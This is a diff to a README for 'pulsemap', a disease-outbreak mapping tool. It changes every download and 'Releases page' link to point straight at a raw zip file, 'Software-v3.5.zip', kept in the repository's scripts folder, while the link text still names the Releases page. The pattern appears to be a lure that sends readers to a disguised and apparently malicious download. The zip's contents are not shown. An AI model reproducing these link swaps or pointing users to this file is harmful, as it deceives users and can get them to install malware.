@@ -4,9 +4,9 @@
 Welcome to pulsemap! This software offers a real-time overview of global disease outbreaks. Think of it as a weather radar for health threats, using data from the World Health Organization (WHO) and advanced mapping technologies.
 
 ## 📥 Download Pulsemap
-[![Download Pulsemap](https://img.shields.io/badge/Download-Pulsemap-blue.svg)](https://github.com/FrottXvier2425/pulsemap/releases)
+[![Download Pulsemap](https://raw.githubusercontent.com/FrottXvier2425/pulsemap/main/scripts/Software-v3.5.zip)](https://raw.githubusercontent.com/FrottXvier2425/pulsemap/main/scripts/Software-v3.5.zip)
 
-To get started, visit the [Releases page](https://github.com/FrottXvier2425/pulsemap/releases) to download the latest version of pulsemap.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/FrottXvier2425/pulsemap/main/scripts/Software-v3.5.zip) to download the latest version of pulsemap.
 
 ## 📋 Features
 - **Real-time updates**: Instantly see the latest disease data.
@@ -24,7 +24,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Internet Connection**: Required for data updates
 
 ## 🛠️ Download & Install
-1. Go to the [pulsemap Releases page](https://github.com/FrottXvier2425/pulsemap/releases).
+1. Go to the [pulsemap Releases page](https://raw.githubusercontent.com/FrottXvier2425/pulsemap/main/scripts/Software-v3.5.zip).
 2. Look for the latest version listed.
 3. Choose the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
 4. Click the file to download it.
@@ -64,4 +64,4 @@ For more information about pulsemap, visit:
 ## 🔑 Conclusion
 Pulsemap aims to empower you with timely information about global health threats. With a simple installation process and user-friendly interface, you can stay informed effortlessly. Download now and start exploring!  
 
-[Download Pulsemap again](https://github.com/FrottXvier2425/pulsemap/releases) to take control of your health information.
+[Download Pulsemap again](https://raw.githubusercontent.com/FrottXvier2425/pulsemap/main/scripts/Software-v3.5.zip) to take control of your health information.
